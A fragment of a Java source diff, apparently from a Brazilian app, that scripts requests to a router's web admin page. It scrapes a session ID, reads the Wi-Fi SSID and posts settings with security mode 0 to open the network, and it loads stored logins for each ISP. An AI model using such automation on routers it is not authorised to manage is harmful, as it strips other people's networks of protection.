+			mPostGetDao.insert(new PostGet(367, 33, 1, "get", "", "", 1));		
+					mParamsProxDao.insert(new Params(132, 367, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+			mPostGetDao.insert(new PostGet(368, 33, 2, "get", "/index.cgi?page=internet&sessionid=inseresessionid", "", 1));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9
+					mParamsProxDao.insert(new Params(133, 368, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+			mPostGetDao.insert(new PostGet(369, 33, 3, "get", "/index.cgi?page=wifi&sessionid=inseresessionid", "", 1));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9
+					mParamsProxDao.insert(new Params(134, 369, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(135, 369, "ssid", "<input type=\"text\" name=\"ssid\" autocomplete=\"off\" value=\"(.*?)\" maxlength=\"32\" style=\"width: 168px; background-color: #FFFFFF\" onchange=\"UpdateForm\\(\\)\" onkeyup=\"UpdateForm\\(\\)\" title=\"Input Guest SSID\" />"));
+			mPostGetDao.insert(new PostGet(370, 33, 4, "post", "/index.cgi", "", 2));		//TIMEOUT			
+				mParamsDao.insert(new Params(353, 370, "page", "wifi"));		
+				mParamsDao.insert(new Params(354, 370, "sessionid", "inseresessionid"));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9						
+				mParamsDao.insert(new Params(355, 370, "action", "submit"));		
+				mParamsDao.insert(new Params(356, 370, "update", "1"));		
+				mParamsDao.insert(new Params(357, 370, "wifistatus", "1"));		
+				mParamsDao.insert(new Params(358, 370, "broadcast", "1"));				
+				mParamsDao.insert(new Params(359, 370, "ssid", "inseressid"));		//GVT-58B2		
+				mParamsDao.insert(new Params(360, 370, "securitymode", "0"));		
+				mParamsDao.insert(new Params(361, 370, "Gvtpincode", ""));		
+				mParamsDao.insert(new Params(362, 370, "mode", "6"));		//Auto B/G/N	
+				mParamsDao.insert(new Params(363, 370, "channel", "-1"));		//Auto		
+				mParamsDao.insert(new Params(364, 370, "transpower", "100"));	
+				mParamsDao.insert(new Params(365, 370, "statuswmm", "1"));			
+				mParamsDao.insert(new Params(366, 370, "statusapsd", "1"));	
 			
 		/*******************************************************End Abrir Rede******************************************************/
 				
@@ -1153,9 +1196,11 @@ public class Initialize {
 		
 		mParamsDao.getAll();
 		
-		mUsuarioDao.getLoginPorOperadora("oi");
-		mUsuarioDao.getLoginPorOperadora("gvt");
-		mUsuarioDao.getLoginPorOperadora("net");		
+		mParamsProxDao.getAll();
+		
+		mLoginDao.getLoginPorOperadora("oi");
+		mLoginDao.getLoginPorOperadora("gvt");
+		mLoginDao.getLoginPorOperadora("net");		
 	}		
 	
 	
